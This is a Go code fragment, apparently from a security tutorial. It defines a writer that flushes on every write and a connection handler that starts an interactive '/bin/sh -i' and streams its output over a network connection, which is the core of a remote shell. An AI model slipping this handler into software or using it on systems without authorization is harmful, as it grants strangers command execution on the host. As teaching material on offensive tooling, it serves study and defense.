// Flusher wraps bufio.Writer, explicitly flushing on all writes
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher creates a new Flusher from an io.Writer
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher {
		w: bufio.NewWriter(w),
	}
}

// Write writes bytes and explicitly flushes buffer.
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

// Tweaked connection handler to instantiate and use Flusher custom type:
func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// for use with stdin and stdout
	// For Windows use exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	// Create Flusher from connection to use for stdout
	// Ensures stdout is flushed adequately and sent via net.Conn
	cmd.Stdout = NewFlusher(conn)

	// Run the command
	if err:= cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}